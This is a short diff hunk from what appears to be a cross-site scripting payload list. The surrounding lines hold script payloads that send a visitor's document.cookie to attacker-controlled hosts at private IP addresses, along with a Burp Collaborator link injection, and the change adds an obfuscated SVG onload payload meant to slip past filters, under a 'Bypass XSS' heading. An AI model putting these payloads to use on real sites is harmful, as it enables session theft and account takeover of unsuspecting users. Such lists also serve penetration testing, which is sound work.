@@ -25,7 +25,7 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 <script>img = new Image(); img.src = "http://192.168.1.44/a.php?"+document.cookie;</script>
 
 "><a%20href="https://xxxxxxxxxxxxxxx.burpcollaborator.net"><H1>Click%20here!</H1></a><input
-
+"><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
 ==============================================================================
 [+] Bypass XSS
 ==============================================================================
